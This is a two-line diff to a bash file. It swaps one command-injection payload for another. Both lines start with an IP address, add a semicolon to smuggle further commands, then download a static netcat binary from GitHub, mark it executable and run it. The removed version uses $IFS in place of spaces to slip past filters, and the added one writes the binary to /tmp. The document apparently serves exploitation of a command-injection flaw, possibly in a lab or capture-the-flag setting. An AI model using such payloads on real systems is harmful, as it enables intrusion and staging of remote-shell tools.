@@ -1,2 +1,2 @@
 #!/bin/bash
-127.0.0.1;wget$IFShttps://github.com/yunchih/static-binaries/raw/master/nc$IFS-O$IFSnc&&chmod$IFS+x$IFSnc&&./nc$IFS-V
+127.0.0.1;wget -qO/tmp/nc https://github.com/yunchih/static-binaries/raw/master/nc;chmod +x /tmp/nc;/tmp/nc -V
